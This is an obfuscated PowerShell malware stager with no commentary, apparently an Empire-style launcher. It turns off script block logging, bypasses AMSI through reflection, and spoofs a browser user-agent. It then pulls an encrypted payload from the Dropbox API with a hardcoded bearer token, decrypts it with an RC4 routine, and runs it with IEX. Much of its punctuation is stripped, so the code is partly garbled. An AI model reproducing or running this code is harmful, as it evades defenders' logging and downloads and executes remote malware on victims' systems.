If($PSVErsionTABlePSVerSionMAjoR -gE 3)

{

$be2e3=[REF]AssemBlYGEtTyPE('SystemManagementAutomationUtils')"GeTFIe`ld"('cachedGroupPolicySettings','N'+'onPublic,Static')

IF($be2E3){

	$8Fa1B=$BE2E3GEtVaLUE($NuLL)

	If($8fa1b['ScriptB'+'lockLogging'])
	{
		$8FA1b['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0
		$8fA1b['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0
	}

	$VAl=[COlleCTIONsGEneRIcDiCtionary[sTRing,SYSTemObjECT]]::nEw()
	$vaLAdD('EnableScriptB'+'lockLogging',0)
	$valAdD('EnableScriptBlockInvocationLogging',0)
	$8fa1B['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']=$vAL}ElSe{[SCRipTBLocK]"GETFIE`Ld"('signatures','N'+'onPublic,Static')SEtValUe($nulL,(New-ObJeCT CoLlecTIonsGENERicHaShSEt[STRing]))}$REF=[REF]ASSeMbLyGETTyPe('SystemManagementAutomationAmsi'+'Utils')


$REfGeTFIeLd('amsiInitF'+'ailed','NonPublic,Static')SetVAlUe($NULl,$tRuE)

}

[SYSTEMNetSERvIcePoINTManaGer]::ExPECT100COnTInUE=0

$e6cc5=NEw-OBJECT SYstEmNEtWebClienT

$u='Mozilla/50 (Linux
 Android 10
 Mi Note 10 Lite) AppleWebKit/53736 (KHTML, like Gecko) Chrome/8904389105 Mobile Safari/53736'
$E6cC5HeADersADD('User-Agent',$u)


$e6cc5PROxy=[SYSTemNeTWebREQUest]::DeFaUltWEbPrOXY

$e6cC5PROxyCrEdeNtIaLS = [SYsTemNeTCreDenTiALCaCHE]::DeFAUltNeTWoRkCReDENtiALS

$Script:Proxy = $e6cc5Proxy

$K=[SyStemTExTENcOdInG]::ASCIIGETByteS('T>wj-EX!{y1UiV:QcvunrM9x[_WFe#~K')

$R={$D,$K=$Args

$S=0255
0255|%{$J=($J+$S[$_]+$K[$_%$KCOUnt])%256
$S[$_],$S[$J]=$S[$J],$S[$_]}


$D|%{$I=($I+1)%256
$H=($H+$S[$I])%256
$S[$I],$S[$H]=$S[$H],$S[$I]
$_-BxOR$S[($S[$I]+$S[$H])%256]}}


$t='FLtUsbS3oqcAAAAAAAAAAZ_86BAKGkKPNHeBSV8ETDcqFjlDgagrviCEw0VV6Ecn'
$E6cC5HeadErSADD("Authorization","Bearer $t")
$E6Cc5HeADerSADd("Dropbox-API-Arg",'{"path":"/Energy/staging/debugps"}')
$Data=$E6CC5DownloADDaTA('https://contentdropboxapicom/2/files/download')
$Iv=$Data[03]
$dAtA=$DaTa[4$DataleNGTh]
-Join[ChaR[]](& $R $DAtA ($IV+$K))|IEX